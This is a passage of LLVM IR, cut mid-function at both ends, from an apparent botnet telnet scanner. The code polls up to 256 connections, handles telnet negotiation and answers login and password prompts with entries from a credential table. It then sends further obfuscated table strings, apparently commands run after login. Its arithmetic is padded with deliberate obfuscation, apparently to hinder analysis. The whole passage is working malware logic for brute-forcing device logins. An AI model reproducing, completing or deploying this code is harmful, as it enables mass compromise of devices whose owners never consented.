  %549 = load i32, i32* %548, align 8
  %550 = icmp ugt i32 %549, 2
  br i1 %550, label %551, label %569

; <label>:551:                                    ; preds = %540
  %552 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %553 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %552, i32 0, i32 8
  %554 = load i8, i8* %553, align 8
  %555 = sub i8 %554, -59
  %556 = add i8 %555, 1
  %557 = add i8 %556, -59
  %558 = add i8 %554, 1
  store i8 %557, i8* %553, align 8
  %559 = zext i8 %557 to i32
  %560 = icmp eq i32 %559, 10
  br i1 %560, label %561, label %566

; <label>:561:                                    ; preds = %551
  %562 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %563 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %562, i32 0, i32 8
  store i8 0, i8* %563, align 8
  %564 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %565 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %564, i32 0, i32 3
  store i32 0, i32* %565, align 8
  br label %568

; <label>:566:                                    ; preds = %551
  %567 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  call void @setup_connection(%struct.scanner_connection* %567)
  br label %568

; <label>:568:                                    ; preds = %566, %561
  br label %574

; <label>:569:                                    ; preds = %540
  %570 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %571 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %570, i32 0, i32 8
  store i8 0, i8* %571, align 8
  %572 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %573 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %572, i32 0, i32 3
  store i32 0, i32* %573, align 8
  br label %574

; <label>:574:                                    ; preds = %569, %568
  br label %669

; <label>:575:                                    ; preds = %529, %515
  %576 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %577 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %576, i32 0, i32 3
  %578 = load i32, i32* %577, align 8
  %579 = icmp eq i32 %578, 1
  br i1 %579, label %580, label %621

; <label>:580:                                    ; preds = %575
  %581 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %582 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %581, i32 0, i32 1
  %583 = load i32, i32* %582, align 8
  %584 = srem i32 %583, 64
  %585 = zext i32 %584 to i64
  %586 = shl i64 1, %585
  %587 = getelementptr inbounds %struct.fd_set.28, %struct.fd_set.28* %6, i32 0, i32 0
  %588 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %589 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %588, i32 0, i32 1
  %590 = load i32, i32* %589, align 8
  %591 = sdiv i32 %590, 64
  %592 = sext i32 %591 to i64
  %593 = getelementptr inbounds [16 x i64], [16 x i64]* %587, i64 0, i64 %592
  %594 = load i64, i64* %593, align 8
  %595 = xor i64 %594, -1
  %596 = xor i64 %586, -1
  %597 = xor i64 3388658673600296353, -1
  %598 = and i64 %595, 3388658673600296353
  %599 = and i64 %594, %597
  %600 = and i64 %596, 3388658673600296353
  %601 = and i64 %586, %597
  %602 = or i64 %598, %599
  %603 = or i64 %600, %601
  %604 = xor i64 %602, %603
  %605 = or i64 %595, %596
  %606 = xor i64 %605, -1
  %607 = or i64 3388658673600296353, %597
  %608 = and i64 %606, %607
  %609 = or i64 %604, %608
  %610 = or i64 %594, %586
  store i64 %609, i64* %593, align 8
  %611 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %612 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %611, i32 0, i32 1
  %613 = load i32, i32* %612, align 8
  %614 = load i32, i32* %12, align 4
  %615 = icmp sgt i32 %613, %614
  br i1 %615, label %616, label %620

; <label>:616:                                    ; preds = %580
  %617 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %618 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %617, i32 0, i32 1
  %619 = load i32, i32* %618, align 8
  store i32 %619, i32* %12, align 4
  br label %620

; <label>:620:                                    ; preds = %616, %580
  br label %668

; <label>:621:                                    ; preds = %575
  %622 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %623 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %622, i32 0, i32 3
  %624 = load i32, i32* %623, align 8
  %625 = icmp ne i32 %624, 0
  br i1 %625, label %626, label %667

; <label>:626:                                    ; preds = %621
  %627 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %628 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %627, i32 0, i32 1
  %629 = load i32, i32* %628, align 8
  %630 = srem i32 %629, 64
  %631 = zext i32 %630 to i64
  %632 = shl i64 1, %631
  %633 = getelementptr inbounds %struct.fd_set.28, %struct.fd_set.28* %5, i32 0, i32 0
  %634 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %635 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %634, i32 0, i32 1
  %636 = load i32, i32* %635, align 8
  %637 = sdiv i32 %636, 64
  %638 = sext i32 %637 to i64
  %639 = getelementptr inbounds [16 x i64], [16 x i64]* %633, i64 0, i64 %638
  %640 = load i64, i64* %639, align 8
  %641 = xor i64 %640, -1
  %642 = xor i64 %632, -1
  %643 = xor i64 1582612103216616711, -1
  %644 = and i64 %641, 1582612103216616711
  %645 = and i64 %640, %643
  %646 = and i64 %642, 1582612103216616711
  %647 = and i64 %632, %643
  %648 = or i64 %644, %645
  %649 = or i64 %646, %647
  %650 = xor i64 %648, %649
  %651 = or i64 %641, %642
  %652 = xor i64 %651, -1
  %653 = or i64 1582612103216616711, %643
  %654 = and i64 %652, %653
  %655 = or i64 %650, %654
  %656 = or i64 %640, %632
  store i64 %655, i64* %639, align 8
  %657 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %658 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %657, i32 0, i32 1
  %659 = load i32, i32* %658, align 8
  %660 = load i32, i32* %11, align 4
  %661 = icmp sgt i32 %659, %660
  br i1 %661, label %662, label %666

; <label>:662:                                    ; preds = %626
  %663 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %664 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %663, i32 0, i32 1
  %665 = load i32, i32* %664, align 8
  store i32 %665, i32* %11, align 4
  br label %666

; <label>:666:                                    ; preds = %662, %626
  br label %667

; <label>:667:                                    ; preds = %666, %621
  br label %668

; <label>:668:                                    ; preds = %667, %620
  br label %669

; <label>:669:                                    ; preds = %668, %574
  %670 = load i32, i32* %1, align 4
  %671 = sub i32 0, 1
  %672 = sub i32 %670, %671
  %673 = add nsw i32 %670, 1
  store i32 %672, i32* %1, align 4
  br label %512

; <label>:674:                                    ; preds = %512
  %675 = getelementptr inbounds %struct.timeval.29, %struct.timeval.29* %8, i32 0, i32 1
  store i64 0, i64* %675, align 8
  %676 = getelementptr inbounds %struct.timeval.29, %struct.timeval.29* %8, i32 0, i32 0
  store i64 1, i64* %676, align 8
  %677 = load i32, i32* %12, align 4
  %678 = load i32, i32* %11, align 4
  %679 = icmp sgt i32 %677, %678
  br i1 %679, label %680, label %682

; <label>:680:                                    ; preds = %674
  %681 = load i32, i32* %12, align 4
  br label %684

; <label>:682:                                    ; preds = %674
  %683 = load i32, i32* %11, align 4
  br label %684

; <label>:684:                                    ; preds = %682, %680
  %685 = phi i32 [ %681, %680 ], [ %683, %682 ]
  %686 = sub i32 0, 1
  %687 = sub i32 0, %685
  %688 = add i32 %686, %687
  %689 = sub i32 0, %688
  %690 = add nsw i32 1, %685
  %691 = call i32 @select(i32 %689, %struct.fd_set.28* %5, %struct.fd_set.28* %6, %struct.fd_set.28* null, %struct.timeval.29* %8)
  store i32 %691, i32* %13, align 4
  %692 = call i64 @time(i64* null) #6
  %693 = trunc i64 %692 to i32
  store i32 %693, i32* @fake_time, align 4
  store i32 0, i32* %1, align 4
  br label %694

; <label>:694:                                    ; preds = %1137, %684
  %695 = load i32, i32* %1, align 4
  %696 = icmp slt i32 %695, 256
  br i1 %696, label %697, label %1143

; <label>:697:                                    ; preds = %694
  %698 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %699 = load i32, i32* %1, align 4
  %700 = sext i32 %699 to i64
  %701 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %698, i64 %700
  store %struct.scanner_connection* %701, %struct.scanner_connection** %7, align 8
  %702 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %703 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %702, i32 0, i32 1
  %704 = load i32, i32* %703, align 8
  %705 = icmp eq i32 %704, -1
  br i1 %705, label %706, label %707

; <label>:706:                                    ; preds = %697
  br label %1137

; <label>:707:                                    ; preds = %697
  %708 = getelementptr inbounds %struct.fd_set.28, %struct.fd_set.28* %6, i32 0, i32 0
  %709 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %710 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %709, i32 0, i32 1
  %711 = load i32, i32* %710, align 8
  %712 = sdiv i32 %711, 64
  %713 = sext i32 %712 to i64
  %714 = getelementptr inbounds [16 x i64], [16 x i64]* %708, i64 0, i64 %713
  %715 = load i64, i64* %714, align 8
  %716 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %717 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %716, i32 0, i32 1
  %718 = load i32, i32* %717, align 8
  %719 = srem i32 %718, 64
  %720 = zext i32 %719 to i64
  %721 = shl i64 1, %720
  %722 = xor i64 %721, -1
  %723 = xor i64 %715, %722
  %724 = and i64 %723, %715
  %725 = and i64 %715, %721
  %726 = icmp ne i64 %724, 0
  br i1 %726, label %727, label %758

; <label>:727:                                    ; preds = %707
  store i32 0, i32* %29, align 4
  store i32 0, i32* %30, align 4
  store i32 4, i32* %31, align 4
  %728 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %729 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %728, i32 0, i32 1
  %730 = load i32, i32* %729, align 8
  %731 = bitcast i32* %29 to i8*
  %732 = call i32 @getsockopt(i32 %730, i32 1, i32 4, i8* %731, i32* %31) #6
  store i32 %732, i32* %30, align 4
  %733 = load i32, i32* %29, align 4
  %734 = icmp eq i32 %733, 0
  br i1 %734, label %735, label %746

; <label>:735:                                    ; preds = %727
  %736 = load i32, i32* %30, align 4
  %737 = icmp eq i32 %736, 0
  br i1 %737, label %738, label %746

; <label>:738:                                    ; preds = %735
  %739 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %740 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %739, i32 0, i32 3
  store i32 2, i32* %740, align 8
  %741 = call %struct.scanner_auth* @random_auth_entry()
  %742 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %743 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %742, i32 0, i32 0
  store %struct.scanner_auth* %741, %struct.scanner_auth** %743, align 8
  %744 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %745 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %744, i32 0, i32 6
  store i32 0, i32* %745, align 4
  br label %757

; <label>:746:                                    ; preds = %735, %727
  %747 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %748 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %747, i32 0, i32 1
  %749 = load i32, i32* %748, align 8
  %750 = call i32 @close(i32 %749)
  %751 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %752 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %751, i32 0, i32 1
  store i32 -1, i32* %752, align 8
  %753 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %754 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %753, i32 0, i32 8
  store i8 0, i8* %754, align 8
  %755 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %756 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %755, i32 0, i32 3
  store i32 0, i32* %756, align 8
  br label %1137

; <label>:757:                                    ; preds = %738
  br label %758

; <label>:758:                                    ; preds = %757, %707
  %759 = getelementptr inbounds %struct.fd_set.28, %struct.fd_set.28* %5, i32 0, i32 0
  %760 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %761 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %760, i32 0, i32 1
  %762 = load i32, i32* %761, align 8
  %763 = sdiv i32 %762, 64
  %764 = sext i32 %763 to i64
  %765 = getelementptr inbounds [16 x i64], [16 x i64]* %759, i64 0, i64 %764
  %766 = load i64, i64* %765, align 8
  %767 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %768 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %767, i32 0, i32 1
  %769 = load i32, i32* %768, align 8
  %770 = srem i32 %769, 64
  %771 = zext i32 %770 to i64
  %772 = shl i64 1, %771
  %773 = xor i64 %772, -1
  %774 = xor i64 %766, %773
  %775 = and i64 %774, %766
  %776 = and i64 %766, %772
  %777 = icmp ne i64 %775, 0
  br i1 %777, label %778, label %1136

; <label>:778:                                    ; preds = %758
  br label %779

; <label>:779:                                    ; preds = %1134, %778
  %780 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %781 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %780, i32 0, i32 3
  %782 = load i32, i32* %781, align 8
  %783 = icmp eq i32 %782, 0
  br i1 %783, label %784, label %785

; <label>:784:                                    ; preds = %779
  br label %1135

; <label>:785:                                    ; preds = %779
  %786 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %787 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %786, i32 0, i32 6
  %788 = load i32, i32* %787, align 4
  %789 = icmp eq i32 %788, 256
  br i1 %789, label %790, label %805

; <label>:790:                                    ; preds = %785
  %791 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %792 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %791, i32 0, i32 7
  %793 = getelementptr inbounds [256 x i8], [256 x i8]* %792, i32 0, i32 0
  %794 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %795 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %794, i32 0, i32 7
  %796 = getelementptr inbounds [256 x i8], [256 x i8]* %795, i32 0, i32 0
  %797 = getelementptr inbounds i8, i8* %796, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %793, i8* %797, i64 192, i32 1, i1 false)
  %798 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %799 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %798, i32 0, i32 6
  %800 = load i32, i32* %799, align 4
  %801 = sub i32 %800, 1532186044
  %802 = sub i32 %801, 64
  %803 = add i32 %802, 1532186044
  %804 = sub nsw i32 %800, 64
  store i32 %803, i32* %799, align 4
  br label %805

; <label>:805:                                    ; preds = %790, %785
  %806 = call i32* @__errno_location() #7
  store i32 0, i32* %806, align 4
  %807 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %808 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %807, i32 0, i32 1
  %809 = load i32, i32* %808, align 8
  %810 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %811 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %810, i32 0, i32 7
  %812 = getelementptr inbounds [256 x i8], [256 x i8]* %811, i32 0, i32 0
  %813 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %814 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %813, i32 0, i32 6
  %815 = load i32, i32* %814, align 4
  %816 = sext i32 %815 to i64
  %817 = getelementptr inbounds i8, i8* %812, i64 %816
  %818 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %819 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %818, i32 0, i32 6
  %820 = load i32, i32* %819, align 4
  %821 = add i32 256, 1141763289
  %822 = sub i32 %821, %820
  %823 = sub i32 %822, 1141763289
  %824 = sub nsw i32 256, %820
  %825 = call i32 @recv_strip_null(i32 %809, i8* %817, i32 %823, i32 16384)
  store i32 %825, i32* %32, align 4
  %826 = load i32, i32* %32, align 4
  %827 = icmp eq i32 %826, 0
  br i1 %827, label %828, label %830

; <label>:828:                                    ; preds = %805
  %829 = call i32* @__errno_location() #7
  store i32 104, i32* %829, align 4
  store i32 -1, i32* %32, align 4
  br label %830

; <label>:830:                                    ; preds = %828, %805
  %831 = load i32, i32* %32, align 4
  %832 = icmp eq i32 %831, -1
  br i1 %832, label %833, label %866

; <label>:833:                                    ; preds = %830
  %834 = call i32* @__errno_location() #7
  %835 = load i32, i32* %834, align 4
  %836 = icmp ne i32 %835, 11
  br i1 %836, label %837, label %865

; <label>:837:                                    ; preds = %833
  %838 = call i32* @__errno_location() #7
  %839 = load i32, i32* %838, align 4
  %840 = icmp ne i32 %839, 11
  br i1 %840, label %841, label %865

; <label>:841:                                    ; preds = %837
  %842 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %843 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %842, i32 0, i32 1
  %844 = load i32, i32* %843, align 8
  %845 = call i32 @close(i32 %844)
  %846 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %847 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %846, i32 0, i32 1
  store i32 -1, i32* %847, align 8
  %848 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %849 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %848, i32 0, i32 8
  %850 = load i8, i8* %849, align 8
  %851 = sub i8 %850, -83
  %852 = add i8 %851, 1
  %853 = add i8 %852, -83
  %854 = add i8 %850, 1
  store i8 %853, i8* %849, align 8
  %855 = zext i8 %853 to i32
  %856 = icmp sge i32 %855, 10
  br i1 %856, label %857, label %862

; <label>:857:                                    ; preds = %841
  %858 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %859 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %858, i32 0, i32 8
  store i8 0, i8* %859, align 8
  %860 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %861 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %860, i32 0, i32 3
  store i32 0, i32* %861, align 8
  br label %864

; <label>:862:                                    ; preds = %841
  %863 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  call void @setup_connection(%struct.scanner_connection* %863)
  br label %864

; <label>:864:                                    ; preds = %862, %857
  br label %865

; <label>:865:                                    ; preds = %864, %837, %833
  br label %1135

; <label>:866:                                    ; preds = %830
  %867 = load i32, i32* %32, align 4
  %868 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %869 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %868, i32 0, i32 6
  %870 = load i32, i32* %869, align 4
  %871 = add i32 %870, -1590710728
  %872 = add i32 %871, %867
  %873 = sub i32 %872, -1590710728
  %874 = add nsw i32 %870, %867
  store i32 %873, i32* %869, align 4
  %875 = load i32, i32* @fake_time, align 4
  %876 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %877 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %876, i32 0, i32 2
  store i32 %875, i32* %877, align 4
  br label %878

; <label>:878:                                    ; preds = %1133, %866
  store i32 0, i32* %33, align 4
  %879 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %880 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %879, i32 0, i32 3
  %881 = load i32, i32* %880, align 8
  switch i32 %881, label %1096 [
    i32 2, label %882
    i32 3, label %890
    i32 4, label %917
    i32 5, label %944
    i32 6, label %964
    i32 7, label %984
    i32 8, label %1004
    i32 9, label %1024
    i32 10, label %1044
  ]

; <label>:882:                                    ; preds = %878
  %883 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %884 = call i32 @consume_iacs(%struct.scanner_connection* %883)
  store i32 %884, i32* %33, align 4
  %885 = icmp sgt i32 %884, 0
  br i1 %885, label %886, label %889

; <label>:886:                                    ; preds = %882
  %887 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %888 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %887, i32 0, i32 3
  store i32 3, i32* %888, align 8
  br label %889

; <label>:889:                                    ; preds = %886, %882
  br label %1097

; <label>:890:                                    ; preds = %878
  %891 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %892 = call i32 @consume_user_prompt(%struct.scanner_connection* %891)
  store i32 %892, i32* %33, align 4
  %893 = icmp sgt i32 %892, 0
  br i1 %893, label %894, label %916

; <label>:894:                                    ; preds = %890
  %895 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %896 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %895, i32 0, i32 1
  %897 = load i32, i32* %896, align 8
  %898 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %899 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %898, i32 0, i32 0
  %900 = load %struct.scanner_auth*, %struct.scanner_auth** %899, align 8
  %901 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %900, i32 0, i32 0
  %902 = load i8*, i8** %901, align 8
  %903 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %904 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %903, i32 0, i32 0
  %905 = load %struct.scanner_auth*, %struct.scanner_auth** %904, align 8
  %906 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %905, i32 0, i32 4
  %907 = load i8, i8* %906, align 4
  %908 = zext i8 %907 to i64
  %909 = call i64 @send(i32 %897, i8* %902, i64 %908, i32 16384)
  %910 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %911 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %910, i32 0, i32 1
  %912 = load i32, i32* %911, align 8
  %913 = call i64 @send(i32 %912, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i64 2, i32 16384)
  %914 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %915 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %914, i32 0, i32 3
  store i32 4, i32* %915, align 8
  br label %916

; <label>:916:                                    ; preds = %894, %890
  br label %1097

; <label>:917:                                    ; preds = %878
  %918 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %919 = call i32 @consume_pass_prompt(%struct.scanner_connection* %918)
  store i32 %919, i32* %33, align 4
  %920 = icmp sgt i32 %919, 0
  br i1 %920, label %921, label %943

; <label>:921:                                    ; preds = %917
  %922 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %923 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %922, i32 0, i32 1
  %924 = load i32, i32* %923, align 8
  %925 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %926 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %925, i32 0, i32 0
  %927 = load %struct.scanner_auth*, %struct.scanner_auth** %926, align 8
  %928 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %927, i32 0, i32 1
  %929 = load i8*, i8** %928, align 8
  %930 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %931 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %930, i32 0, i32 0
  %932 = load %struct.scanner_auth*, %struct.scanner_auth** %931, align 8
  %933 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %932, i32 0, i32 5
  %934 = load i8, i8* %933, align 1
  %935 = zext i8 %934 to i64
  %936 = call i64 @send(i32 %924, i8* %929, i64 %935, i32 16384)
  %937 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %938 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %937, i32 0, i32 1
  %939 = load i32, i32* %938, align 8
  %940 = call i64 @send(i32 %939, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i64 2, i32 16384)
  %941 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %942 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %941, i32 0, i32 3
  store i32 5, i32* %942, align 8
  br label %943

; <label>:943:                                    ; preds = %921, %917
  br label %1097

; <label>:944:                                    ; preds = %878
  %945 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %946 = call i32 @consume_any_prompt(%struct.scanner_connection* %945)
  store i32 %946, i32* %33, align 4
  %947 = icmp sgt i32 %946, 0
  br i1 %947, label %948, label %963

; <label>:948:                                    ; preds = %944
  call void @table_unlock_val(i8 zeroext 5)
  %949 = call i8* @table_retrieve_val(i32 5, i32* %35)
  store i8* %949, i8** %34, align 8
  %950 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %951 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %950, i32 0, i32 1
  %952 = load i32, i32* %951, align 8
  %953 = load i8*, i8** %34, align 8
  %954 = load i32, i32* %35, align 4
  %955 = sext i32 %954 to i64
  %956 = call i64 @send(i32 %952, i8* %953, i64 %955, i32 16384)
  %957 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %958 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %957, i32 0, i32 1
  %959 = load i32, i32* %958, align 8
  %960 = call i64 @send(i32 %959, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 5)
  %961 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %962 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %961, i32 0, i32 3
  store i32 6, i32* %962, align 8
  br label %963

; <label>:963:                                    ; preds = %948, %944
  br label %1097

; <label>:964:                                    ; preds = %878
  %965 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %966 = call i32 @consume_any_prompt(%struct.scanner_connection* %965)
  store i32 %966, i32* %33, align 4
  %967 = icmp sgt i32 %966, 0
  br i1 %967, label %968, label %983

; <label>:968:                                    ; preds = %964
  call void @table_unlock_val(i8 zeroext 6)
  %969 = call i8* @table_retrieve_val(i32 6, i32* %37)
  store i8* %969, i8** %36, align 8
  %970 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %971 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %970, i32 0, i32 1
  %972 = load i32, i32* %971, align 8
  %973 = load i8*, i8** %36, align 8
  %974 = load i32, i32* %37, align 4
  %975 = sext i32 %974 to i64
  %976 = call i64 @send(i32 %972, i8* %973, i64 %975, i32 16384)
  %977 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %978 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %977, i32 0, i32 1
  %979 = load i32, i32* %978, align 8
  %980 = call i64 @send(i32 %979, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 6)
  %981 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %982 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %981, i32 0, i32 3
  store i32 7, i32* %982, align 8
  br label %983

; <label>:983:                                    ; preds = %968, %964
  br label %1097

; <label>:984:                                    ; preds = %878
  %985 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %986 = call i32 @consume_any_prompt(%struct.scanner_connection* %985)
  store i32 %986, i32* %33, align 4
  %987 = icmp sgt i32 %986, 0
  br i1 %987, label %988, label %1003

; <label>:988:                                    ; preds = %984
  call void @table_unlock_val(i8 zeroext 4)
  %989 = call i8* @table_retrieve_val(i32 4, i32* %39)
  store i8* %989, i8** %38, align 8
  %990 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %991 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %990, i32 0, i32 1
  %992 = load i32, i32* %991, align 8
  %993 = load i8*, i8** %38, align 8
  %994 = load i32, i32* %39, align 4
  %995 = sext i32 %994 to i64
  %996 = call i64 @send(i32 %992, i8* %993, i64 %995, i32 16384)
  %997 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %998 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %997, i32 0, i32 1
  %999 = load i32, i32* %998, align 8
  %1000 = call i64 @send(i32 %999, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 4)
  %1001 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1002 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1001, i32 0, i32 3
  store i32 8, i32* %1002, align 8
  br label %1003

; <label>:1003:                                   ; preds = %988, %984
  br label %1097

; <label>:1004:                                   ; preds = %878
  %1005 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1006 = call i32 @consume_any_prompt(%struct.scanner_connection* %1005)
  store i32 %1006, i32* %33, align 4
  %1007 = icmp sgt i32 %1006, 0
  br i1 %1007, label %1008, label %1023

; <label>:1008:                                   ; preds = %1004
